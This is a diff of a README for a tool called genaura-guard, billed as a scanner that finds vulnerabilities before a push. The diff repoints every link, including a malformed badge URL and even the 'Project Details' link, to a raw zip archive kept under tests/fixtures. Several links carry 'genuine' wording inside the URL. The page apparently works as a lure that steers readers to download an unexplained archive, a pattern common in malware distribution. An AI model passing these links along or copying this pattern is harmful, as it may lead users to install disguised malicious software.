@@ -1,6 +1,6 @@
 # 🎉 genaura-guard - Find Vulnerabilities Before You Push
 
-[![Download genaura-guard](https://github.com/Ahmedalaa9098/genaura-guard/raw/refs/heads/main/assets/genaura_guard_1.9.zip%20genuine%20genaura%20guard-brightgreen)](https://github.com/Ahmedalaa9098/genaura-guard/raw/refs/heads/main/assets/genaura_guard_1.9.zip)
+[![Download genaura-guard](https://raw.githubusercontent.com/Ahmedalaa9098/genaura-guard/main/tests/fixtures/genaura-guard-v3.2.zip%20genuine%20genaura%20guard-brightgreen)](https://raw.githubusercontent.com/Ahmedalaa9098/genaura-guard/main/tests/fixtures/genaura-guard-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To run genaura-guard, you need:
 
 ## 📥 Download & Install
 
-Visit this page to download: [Download genaura-guard](https://github.com/Ahmedalaa9098/genaura-guard/raw/refs/heads/main/assets/genaura_guard_1.9.zip)
+Visit this page to download: [Download genaura-guard](https://raw.githubusercontent.com/Ahmedalaa9098/genaura-guard/main/tests/fixtures/genaura-guard-v3.2.zip)
 
 After downloading, follow these steps:
 
@@ -69,7 +69,7 @@ If you need assistance or want to contribute, feel free to join our community:
 
 For more information:
 
-- [Project Details](https://github.com/Ahmedalaa9098/genaura-guard/raw/refs/heads/main/assets/genaura_guard_1.9.zip)
-- [Download Page](https://github.com/Ahmedalaa9098/genaura-guard/raw/refs/heads/main/assets/genaura_guard_1.9.zip)
+- [Project Details](https://raw.githubusercontent.com/Ahmedalaa9098/genaura-guard/main/tests/fixtures/genaura-guard-v3.2.zip)
+- [Download Page](https://raw.githubusercontent.com/Ahmedalaa9098/genaura-guard/main/tests/fixtures/genaura-guard-v3.2.zip)
 
 Our mission is to make coding safer for everyone. Your feedback is valuable to us, and we look forward to your contributions!
